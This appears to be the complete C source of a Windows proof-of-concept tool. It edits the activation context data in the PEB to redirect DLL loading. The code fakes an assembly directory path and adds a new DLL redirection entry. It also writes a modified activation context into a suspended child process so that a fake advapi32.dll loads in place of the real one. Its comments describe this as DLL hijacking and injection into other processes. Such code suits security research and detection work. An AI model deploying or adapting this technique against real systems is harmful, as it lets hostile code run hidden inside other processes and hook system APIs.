#include        "defs.h"

PACTIVATION_CONTEXT_DATA        g_pActivationContextData;

PVOID   GetAssemblyManifestPath(__in ULONG      index, __out DWORD *pdwLength){
        PCACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER        pAssemblyHeader;
        PACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_ENTRY          pAssemblyEntry;
        PACTIVATION_CONTEXT_DATA_ASSEMBLY_INFORMATION           pAssemblyInfo;
        ULONG_PTR                                               AssemblyInformationSection;
        
        pAssemblyHeader = (PCACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER)((ULONG_PTR)g_pActivationContextData + g_pActivationContextData->AssemblyRosterOffset);
        AssemblyInformationSection = (ULONG_PTR)g_pActivationContextData + pAssemblyHeader->AssemblyInformationSectionOffset;
        pAssemblyEntry  = (PACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_ENTRY)((ULONG_PTR)g_pActivationContextData + pAssemblyHeader->FirstEntryOffset);        
        pAssemblyInfo = (PACTIVATION_CONTEXT_DATA_ASSEMBLY_INFORMATION)((ULONG_PTR)g_pActivationContextData + pAssemblyEntry[index].AssemblyInformationOffset);
        
        if (!pAssemblyInfo->ManifestPathOffset) return NULL;
        
        *pdwLength = pAssemblyInfo->ManifestPathLength;
        return (PVOID)((ULONG_PTR)AssemblyInformationSection + pAssemblyInfo->ManifestPathOffset);       
}

PVOID   GetAssemblyDirectoryPath(__in ULONG     index, __out DWORD *pdwLength){
        PCACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER        pAssemblyHeader;
        PACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_ENTRY          pAssemblyEntry;
        PACTIVATION_CONTEXT_DATA_ASSEMBLY_INFORMATION           pAssemblyInfo;
        ULONG_PTR                                               AssemblyInformationSection;
        
        pAssemblyHeader = (PCACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER)((ULONG_PTR)g_pActivationContextData + g_pActivationContextData->AssemblyRosterOffset);
        AssemblyInformationSection = (ULONG_PTR)g_pActivationContextData + pAssemblyHeader->AssemblyInformationSectionOffset;
        pAssemblyEntry  = (PACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_ENTRY)((ULONG_PTR)g_pActivationContextData + pAssemblyHeader->FirstEntryOffset);        
        pAssemblyInfo = (PACTIVATION_CONTEXT_DATA_ASSEMBLY_INFORMATION)((ULONG_PTR)g_pActivationContextData + pAssemblyEntry[index].AssemblyInformationOffset);
        
        if (!pAssemblyInfo->AssemblyDirectoryNameOffset) return NULL;
        
        *pdwLength = pAssemblyInfo->AssemblyDirectoryNameLength;
        return (PVOID)((ULONG_PTR)AssemblyInformationSection + pAssemblyInfo->AssemblyDirectoryNameOffset);       
}        

BOOL    SetAssemblyDirectoryPathLength(__in ULONG     index, __out DWORD dwLength){
        PCACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER        pAssemblyHeader;
        PACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_ENTRY          pAssemblyEntry;
        PACTIVATION_CONTEXT_DATA_ASSEMBLY_INFORMATION           pAssemblyInfo;
        ULONG_PTR                                               AssemblyInformationSection;
        
        pAssemblyHeader = (PCACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_HEADER)((ULONG_PTR)g_pActivationContextData + g_pActivationContextData->AssemblyRosterOffset);
        AssemblyInformationSection = (ULONG_PTR)g_pActivationContextData + pAssemblyHeader->AssemblyInformationSectionOffset;
        pAssemblyEntry  = (PACTIVATION_CONTEXT_DATA_ASSEMBLY_ROSTER_ENTRY)((ULONG_PTR)g_pActivationContextData + pAssemblyHeader->FirstEntryOffset);        
        pAssemblyInfo = (PACTIVATION_CONTEXT_DATA_ASSEMBLY_INFORMATION)((ULONG_PTR)g_pActivationContextData + pAssemblyEntry[index].AssemblyInformationOffset);
        
        if (!pAssemblyInfo->AssemblyDirectoryNameOffset) return FALSE;
        
        pAssemblyInfo->AssemblyDirectoryNameLength = dwLength;
        return TRUE;       
}  

ULONG   ReplaceDLLRedirectionGetRoster(__in WCHAR *wsDllName){
        PCACTIVATION_CONTEXT_DATA_TOC_HEADER    pTocHeader;
        PCACTIVATION_CONTEXT_DATA_TOC_ENTRY     pTocEntry;
        PACTIVATION_CONTEXT_STRING_SECTION_HEADER pStringHeader;
        PACTIVATION_CONTEXT_STRING_SECTION_ENTRY  pStringEntry;
        //PACTIVATION_CONTEXT_DATA_DLL_REDIRECTION  pDllRedirection;
        ULONG                                   index, jindex;
        
        pTocHeader = (PCACTIVATION_CONTEXT_DATA_TOC_HEADER)((ULONG_PTR)g_pActivationContextData + g_pActivationContextData->DefaultTocOffset);
        pTocEntry = (PCACTIVATION_CONTEXT_DATA_TOC_ENTRY)((ULONG_PTR)g_pActivationContextData + pTocHeader->FirstEntryOffset);
        
        for (index = 0; index < pTocHeader->EntryCount; index++){
                if (pTocEntry[index].Id != ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) continue;
                
                pStringHeader = (PACTIVATION_CONTEXT_STRING_SECTION_HEADER)((ULONG_PTR)g_pActivationContextData + pTocEntry[index].Offset);
                
                pStringEntry = (PACTIVATION_CONTEXT_STRING_SECTION_ENTRY)((ULONG_PTR)pStringHeader + pStringHeader->ElementListOffset);
                for (jindex = 0; jindex < pStringHeader->ElementCount; jindex++){       
                        if (!_wcsicmp((WCHAR *)((ULONG_PTR)pStringHeader + pStringEntry[jindex].KeyOffset), wsDllName)) return pStringEntry[jindex].AssemblyRosterIndex;                       
                }
        }
        return 0;
}
/***************************************************************************
 * This code will move DLL_REDIRECTION string section to the end. Update
 * offsets properly, and set new DLL_REDIRECTION entry which will allow 
 * dll redirection to another dll. If NtRead/WriteVirtualMemory are used
 * suspended process can be faked to load dlls from different path. This
 * can be used also at runtime to inject DLL into another process if dll
 * loading is triggered somehow, of course, 
 ***************************************************************************/
ULONG   AddDllRedirection(__in WCHAR *wsDllName, __in WCHAR *wsNewDllPath, __in DWORD dwOldSize, __in DWORD dwNewSize){
        PCACTIVATION_CONTEXT_DATA_TOC_HEADER    pTocHeader;
        PCACTIVATION_CONTEXT_DATA_TOC_ENTRY     pTocEntry;
        PACTIVATION_CONTEXT_STRING_SECTION_HEADER pStringHeader;
        PACTIVATION_CONTEXT_STRING_SECTION_ENTRY  pStringEntry;
        PACTIVATION_CONTEXT_DATA_DLL_REDIRECTION  pDllRedirection;
        PACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT pDllRedirectionPathSegment;
        
        ULONG                                   index;
        ULONG_PTR                               write_offset;
        ULONG_PTR                               entries_offset;
        ULONG_PTR                               string_write_offset;
        UNICODE_STRING                          UnicodeString;
        RTLHASHUNICODESTRING                    fnRtlHashUnicodeString;
        
        fnRtlHashUnicodeString = (RTLHASHUNICODESTRING)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlHashUnicodeString");
        
        
        //these are hardcoded values, properly would be to calculate at runtime how much space we actually need
        write_offset   = (ULONG_PTR)((ULONG_PTR)g_pActivationContextData + dwNewSize - 0x5000);
        entries_offset = (ULONG_PTR)((ULONG_PTR)g_pActivationContextData + dwNewSize - 0x1000);
        
        pTocHeader = (PCACTIVATION_CONTEXT_DATA_TOC_HEADER)((ULONG_PTR)g_pActivationContextData + g_pActivationContextData->DefaultTocOffset);
        pTocEntry = (PCACTIVATION_CONTEXT_DATA_TOC_ENTRY)((ULONG_PTR)g_pActivationContextData + pTocHeader->FirstEntryOffset);
        
        for (index = 0; index < pTocHeader->EntryCount; index++){
                if (pTocEntry[index].Id != ACTIVATION_CONTEXT_SECTION_DLL_REDIRECTION) continue;
                
                //do copy to new offset... now move section entries to the end...
                memcpy((PVOID)write_offset, (PVOID)((ULONG_PTR)g_pActivationContextData + pTocEntry[index].Offset), pTocEntry[index].Length);
                pTocEntry[index].Offset = (ULONG)(write_offset - (ULONG_PTR)g_pActivationContextData);
                
                pStringHeader = (PACTIVATION_CONTEXT_STRING_SECTION_HEADER)((ULONG_PTR)g_pActivationContextData + pTocEntry[index].Offset);
                
                //copy entries to the entries_offset...
                memcpy((PVOID)entries_offset, (PVOID)((ULONG_PTR)pStringHeader + pStringHeader->ElementListOffset), pStringHeader->ElementCount * sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY));
                pStringHeader->ElementListOffset = (ULONG)(entries_offset - write_offset);        
                pStringHeader->Flags             = ACTIVATION_CONTEXT_STRING_SECTION_CASE_INSENSITIVE; //0;   //say taht we don't have hashing via pseudokey but we support case insensitive
                                                        //this is done thus we don't have to reorder entries based on hash...
                
                //take last existing StringEntry...
                pStringEntry = (PACTIVATION_CONTEXT_STRING_SECTION_ENTRY)((ULONG_PTR)pStringHeader + pStringHeader->ElementListOffset + pStringHeader->ElementCount * sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY));
                pStringHeader->ElementCount++;
                
                memset(pStringEntry, 0, sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY));
                
                string_write_offset = (ULONG_PTR)pStringEntry + sizeof(ACTIVATION_CONTEXT_STRING_SECTION_ENTRY);
                //write key offset...
                
                //1st add valid pseudo key...
                RtlInitUnicodeString(&UnicodeString, wsDllName);
                fnRtlHashUnicodeString(&UnicodeString, TRUE, HASH_STRING_ALGORITHM_X65599, &pStringEntry->PseudoKey);
                
                //2nd set new Key value in string entry (this is used to match dll name)                
                wcscpy((void *)string_write_offset, wsDllName);
                pStringEntry->KeyOffset = (ULONG)(string_write_offset - write_offset);
                pStringEntry->KeyLength = (ULONG)wcslen(wsDllName) * sizeof(WCHAR);
                string_write_offset += pStringEntry->KeyLength;
                pStringEntry->Offset = (ULONG)(string_write_offset - write_offset);
                pStringEntry->Length = (ULONG)wcslen(wsNewDllPath) * sizeof(WCHAR) + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION) + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT);
                
                //now add new dll redirection
                pDllRedirection = (PACTIVATION_CONTEXT_DATA_DLL_REDIRECTION)string_write_offset;
                //say that PathSegment will include base dllname and that path should be expanded via ExpandEnvironmentStrings
                pDllRedirection->Flags = ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_INCLUDES_BASE_NAME | ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_EXPAND | ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SYSTEM_DEFAULT_REDIRECTED_SYSTEM32_DLL;
                //there is only 1 path segment...
                pDllRedirection->PathSegmentCount = 1;
                pDllRedirection->PathSegmentOffset = (ULONG)(string_write_offset - write_offset + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION));
                string_write_offset += sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION);
                
                pDllRedirectionPathSegment = (PACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT)string_write_offset;
                pDllRedirectionPathSegment->Length = (ULONG)(wcslen(wsNewDllPath) * sizeof(WCHAR));
                pDllRedirectionPathSegment->Offset = (ULONG)(string_write_offset - write_offset + sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT));
                
                string_write_offset += sizeof(ACTIVATION_CONTEXT_DATA_DLL_REDIRECTION_PATH_SEGMENT);
                wcscpy((void *)string_write_offset, wsNewDllPath);
                string_write_offset += wcslen(wsNewDllPath) * sizeof(WCHAR);
                
                pTocEntry[index].Length = (ULONG)(string_write_offset - write_offset);
                
                g_pActivationContextData->TotalSize = (ULONG)(string_write_offset - (ULONG_PTR)g_pActivationContextData);
        }
        return 0;
      
}

//This is used to create new ActivationContextData. NTDLL doesn't cash this address, and always reads it from PEB
//thus this trick will work...
PVOID   RemapActivationContextIncrease(HANDLE   hProcess, __in BOOL b_use_system_default, __in DWORD  dwExtendSectionSize, __out DWORD *pdwOldLength, __out DWORD *pdwNewLength){
        ULONG_PTR                       pActivationContextData;
        ULONG_PTR                       pNewActivationContext;
        MEMORY_BASIC_INFORMATION        mbi;
        ULONG_PTR                       peb;
        PROCESS_BASIC_INFORMATION       pbi;
        ULONG                           cbNeeded;
        PVOID                           pLocalActivationContextData;
        
        NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &cbNeeded);
        peb = (ULONG_PTR)pbi.PebBaseAddress;
        #ifdef _WIN64
        if (!b_use_system_default)
                ReadProcessMemory(hProcess, (PVOID)(peb+0x2f8), &pActivationContextData, sizeof(pActivationContextData), 0);
        else
                ReadProcessMemory(hProcess, (PVOID)(peb+0x308), &pActivationContextData, sizeof(pActivationContextData), 0);

        #else
        if (!b_use_system_default)
                ReadProcessMemory(hProcess, (PVOID)(peb+0x1f8), &pActivationContextData, sizeof(pActivationContextData), 0);
        else
                ReadProcessMemory(hProcess, (PVOID)(peb+0x200), &pActivationContextData, sizeof(pActivationContextData), 0);
        #endif  
        
        VirtualQueryEx(hProcess, (PVOID)pActivationContextData, &mbi, sizeof(mbi));
        pNewActivationContext = (ULONG_PTR)VirtualAllocEx(hProcess, 0, mbi.RegionSize + dwExtendSectionSize, MEM_COMMIT, PAGE_READWRITE);
        pLocalActivationContextData = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mbi.RegionSize + dwExtendSectionSize);
        ReadProcessMemory(hProcess, (PVOID)pActivationContextData, pLocalActivationContextData, mbi.RegionSize, 0);
        WriteProcessMemory(hProcess, (PVOID)pNewActivationContext, pLocalActivationContextData, mbi.RegionSize, 0);
        
        #ifdef _WIN64
        if (!b_use_system_default)
                WriteProcessMemory(hProcess, (PVOID)(peb+0x2f8), &pNewActivationContext, sizeof(pNewActivationContext), 0);
        else
                WriteProcessMemory(hProcess, (PVOID)(peb+0x308), &pNewActivationContext, sizeof(pNewActivationContext), 0);
        #else
        if (!b_use_system_default)
                WriteProcessMemory(hProcess, (PVOID)(peb+0x1f8), &pNewActivationContext, sizeof(pNewActivationContext), 0);
        else
                WriteProcessMemory(hProcess, (PVOID)(peb+0x200), &pNewActivationContext, sizeof(pNewActivationContext), 0);
        #endif  
        
        *pdwOldLength = (ULONG)mbi.RegionSize;
        *pdwNewLength = (ULONG)mbi.RegionSize + dwExtendSectionSize;
        return pLocalActivationContextData;
}

PVOID   RemapActivationContext(__in BOOL b_use_system_default){
        ULONG_PTR                       pActivationContextData;
        ULONG_PTR                       pNewActivationContext;
        MEMORY_BASIC_INFORMATION        mbi;
        ULONG_PTR                       peb;
        
        //note ActivationContextData is mapped section, thus to be able to manipulate it we need
        //to UnmapViewOfSection and allocate memory instead of it.
        #ifdef _WIN64
        peb = __readgsqword(0x60);
        if (!b_use_system_default)
                pActivationContextData  = *(ULONG_PTR *)(peb + 0x2f8);
        else
                pActivationContextData  = *(ULONG_PTR *)(peb + 0x308);
        #else
        peb = __readfsdword(0x30);
        if (!b_use_system_default)
                pActivationContextData  = *(ULONG_PTR *)(peb + 0x1f8);
        else
                pActivationContextData  = *(ULONG_PTR *)(peb + 0x200);
        #endif  
        
        VirtualQuery((PVOID)pActivationContextData, &mbi, sizeof(mbi));
        pNewActivationContext = (ULONG_PTR)VirtualAlloc(0, mbi.RegionSize, MEM_COMMIT, PAGE_READWRITE);
        memcpy((PVOID)pNewActivationContext, (PVOID)pActivationContextData, mbi.RegionSize);
        
        UnmapViewOfFile((PVOID)pActivationContextData);
        pActivationContextData = (ULONG_PTR)VirtualAlloc((PVOID)pActivationContextData, mbi.RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        memcpy((PVOID)pActivationContextData, (PVOID)pNewActivationContext, mbi.RegionSize);
        VirtualFree((PVOID)pNewActivationContext, 0, MEM_RELEASE);
        return (PVOID)pActivationContextData;
}

VOID    UpdateActivationContext(__in HANDLE hProcess, __in BOOL b_use_system_default, __in PVOID lpBuffer, __in DWORD dwSize){
        PROCESS_BASIC_INFORMATION       pbi;
        ULONG                           cbNeeded;
        ULONG_PTR                       pActivationContextData;
        ULONG_PTR                       peb;
        
        NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &cbNeeded);
        peb = (ULONG_PTR)pbi.PebBaseAddress;
        #ifdef _WIN64
        if (!b_use_system_default)
                ReadProcessMemory(hProcess, (PVOID)(peb+0x2f8), &pActivationContextData, sizeof(pActivationContextData), 0);
        else
                ReadProcessMemory(hProcess, (PVOID)(peb+0x308), &pActivationContextData, sizeof(pActivationContextData), 0);

        #else
        if (!b_use_system_default)
                ReadProcessMemory(hProcess, (PVOID)(peb+0x1f8), &pActivationContextData, sizeof(pActivationContextData), 0);
        else
                ReadProcessMemory(hProcess, (PVOID)(peb+0x200), &pActivationContextData, sizeof(pActivationContextData), 0);
        #endif 
        
        WriteProcessMemory(hProcess, (PVOID)pActivationContextData, lpBuffer, dwSize, 0);
                
}

int __cdecl wmain(int argc, wchar_t **argv){
        PACTIVATION_CONTEXT_DATA        pActivationContextData;        
        DWORD                           dwLength;
        ULONG                           dwAssemblyRoosterIndex;
        WCHAR                           wsFullPathName[MAX_PATH];
        WCHAR                           wsNewAssemblyPath[MAX_PATH];
        WCHAR                           *current;
        size_t                          len;
        DWORD                           dwOldSize, dwNewSize;
        STARTUPINFO                     sinfo;
        PROCESS_INFORMATION             pinfo;
        
        WCHAR                           wsAdvapiFullPath[MAX_PATH];
        WCHAR                           wsAdvapiExpanded[MAX_PATH];
        WCHAR                           wsFakeAdvapi[MAX_PATH];
        BOOL                            b_debug_ldr = FALSE;
        
        if (argc == 2 && !_wcsicmp(argv[1], L"--debug"))
                b_debug_ldr = TRUE;
                
        memset(wsAdvapiFullPath, 0, sizeof(wsAdvapiFullPath));
        memset(wsAdvapiExpanded, 0, sizeof(wsAdvapiExpanded));
        
        LoadLibrary(L"advapi32.dll");
        
        GetModuleFileName(GetModuleHandle(L"advapi32.dll"), wsAdvapiFullPath, MAX_PATH);
        ExpandEnvironmentStrings(L"%systemroot%\\system32\\advapi32.dll", wsAdvapiExpanded, MAX_PATH);
        if (_wcsicmp(wsAdvapiFullPath, wsAdvapiExpanded)){
                MessageBox(0, L"weeheeee advapi32.dll redirected...", L"oki...", 0);
                ExitProcess(0);
        }    

        pActivationContextData = RemapActivationContext(TRUE); 
        
        g_pActivationContextData = pActivationContextData;

        dwAssemblyRoosterIndex = ReplaceDLLRedirectionGetRoster(L"sxsoaps.dll");
        //wprintf(L"%s\n", GetAssemblyManifestPath(dwAssemblyRoosterIndex, &dwLength));
        //wprintf(L"%s\n", GetAssemblyDirectoryPath(dwAssemblyRoosterIndex, &dwLength));  
        
        memset(wsFullPathName, 0, sizeof(wsFullPathName));
        GetModuleFileName(GetModuleHandle(0), wsFullPathName, MAX_PATH);
        current = wcsrchr(wsFullPathName, '\\');
        *current = 0;
        current = wcschr(wsFullPathName, '\\');
        current++;
        
        
        memset(wsNewAssemblyPath, 0, sizeof(wsNewAssemblyPath));
        wcscpy(wsNewAssemblyPath, L"..\\..\\");
        wcscat(wsNewAssemblyPath, current);
        
        len = wcslen(wsNewAssemblyPath) * sizeof(WCHAR);
        memcpy(GetAssemblyDirectoryPath(dwAssemblyRoosterIndex, &dwLength), wsNewAssemblyPath, len);
        SetAssemblyDirectoryPathLength(dwAssemblyRoosterIndex, (DWORD)len);
        //Due to DLL redirection this file should be loaded from C:\windows\winsxs\<folder>\sxsoaps.dll
        //but as we faked Assembly Folder with ..\..\path_to_our_folder calling LoadLibrary or LdrpLoadDll
        //will force loading of this DLL from our hijacked path.
        LoadLibrary(L"sxsoaps.dll");
        
        pActivationContextData = RemapActivationContextIncrease(GetCurrentProcess(), FALSE, 0x5000, &dwOldSize, &dwNewSize);
        g_pActivationContextData = pActivationContextData;
        
        
        memset(wsFullPathName, 0, sizeof(wsFullPathName));
        GetModuleFileName(GetModuleHandle(0), wsFullPathName, MAX_PATH);
        current = wcsrchr(wsFullPathName, '\\');
        *current = 0;
        wcscat(wsFullPathName, L"\\redirecteddll.dll");
        
        //Loading meh.dll will cause redirecteddll.dll to be loaded
        //example of DLL hijacking, hooking, or whatever you wanna call it. 
        //Note that this can be used with Suspended Process to cause injection into it...
        AddDllRedirection(L"meh.dll", wsFullPathName, dwOldSize, dwNewSize);
        
        UpdateActivationContext(GetCurrentProcess(), FALSE, g_pActivationContextData, dwNewSize);
        HeapFree(GetProcessHeap(), 0, (PVOID)pActivationContextData);
        
        LoadLibrary(L"meh.dll");
        
        //hook advapi32.dll example... Well not really hooking, but if dll is fake advapi32.dll with
        //faked exports, your dll will be injected. Of course, make sure to redirect to real advapi32.dll
        //all exported calls :)
        
        memset(&sinfo, 0, sizeof(sinfo));
        memset(&pinfo, 0, sizeof(pinfo));
        
        memset(wsFullPathName, 0, sizeof(wsFullPathName));
        GetModuleFileName(GetModuleHandle(0), wsFullPathName, MAX_PATH);

        
        if (!CreateProcess(0,
                           wsFullPathName, 
                           0,
                           0,
                           0,
                           CREATE_SUSPENDED,
                           0,
                           0,
                           &sinfo,
                           &pinfo)){
                printf("[X] bummer, failed to create child process...\n");
                return 1;
        }

        pActivationContextData = RemapActivationContextIncrease(pinfo.hProcess, FALSE, 0x5000, &dwOldSize, &dwNewSize);
        g_pActivationContextData = pActivationContextData;
        
        memset(wsFakeAdvapi, 0, sizeof(wsFakeAdvapi));
        GetModuleFileName(GetModuleHandle(0), wsFakeAdvapi, MAX_PATH);
        current = wcsrchr(wsFakeAdvapi, '\\');
        *current = 0;
        wcscat(wsFakeAdvapi, L"\\advapi32.dll"); 
        
        AddDllRedirection(L"advapi32.dll", wsFakeAdvapi, dwOldSize, dwNewSize);
        
        UpdateActivationContext(pinfo.hProcess, FALSE, g_pActivationContextData, dwNewSize);
        HeapFree(GetProcessHeap(), 0, (PVOID)pActivationContextData);
        
        if (b_debug_ldr)
                InjectLdrBreak(pinfo.hProcess, pinfo.hThread);
        
        CopyFile(wsAdvapiExpanded, wsFakeAdvapi, FALSE);
        
        ResumeThread(pinfo.hThread);
        
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        DeleteFile(wsFakeAdvapi);
}
